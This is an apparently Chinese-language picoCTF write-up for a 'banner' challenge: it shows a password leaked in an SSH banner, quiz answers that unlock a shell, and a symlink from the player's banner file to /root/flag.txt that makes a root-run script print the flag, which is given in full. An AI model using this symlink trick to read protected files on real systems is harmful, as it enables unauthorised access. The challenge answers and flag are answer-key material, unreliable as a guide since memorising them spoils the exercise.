# Description
```text
Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 58851. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 51029. From the above information abuse the machine and find the flag in the /root directory.
```

# 解題
先用 `netcat` 連線到 `tethys.picoctf.net 58851`
```bash
└─$ nc tethys.picoctf.net 58851
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

接下來連線到 `tethys.picoctf.net 51029` 會連續問幾題問題，依序回答後即可進到 Shell
```bash
└─$ nc tethys.picoctf.net 51029
*************************************
**************WELCOME****************
*************************************
# 這裡的密碼推測是剛開始連線時取得的 My_Passw@rd_@1234
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
JOHN
player@challenge:~$
```
首先使用 `ls` 發現底下有兩個檔案
```bash
player@challenge:~$ ls
ls
banner  text
```
根據題目，得知 flag 在 `/root` 目錄下，故先去看 `/root`，發現底下有兩個檔案
```bash
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
```
使用 `cat` 看兩個檔案的內容
```bash
# 發現對於 flag.txt 沒權限
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
```
接者是 script.py，可以發現以下這段程式碼負責開啟 `/home/player/banner`，並在剛連線時顯示這個 banner。可以利用這點，使用 `ln` 為 `/root/flag.txt` 建立名為 banner 的符號連結，以讓 script.py 可以用這個連結，以 flag.txt 內容取代原本的 banner
```python
with open("/home/player/banner", "r") as f:
```
首先移除 /home/player/banner
```bash
player@challenge:~$ rm banner
```
接著建立符號連結後，中斷連線並重新連線，就可以看到 flag
```bash
player@challenge:~$ ln -s /root/flag.txt ~/banner
ln -s /root/flag.txt ~/banner
player@challenge:~$ ^C
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads]
└─$ nc tethys.picoctf.net 51029
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}

what is the password?
```

# 本題 flag
<!-- flag -->
所以本題 FLAG 
```text
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
```
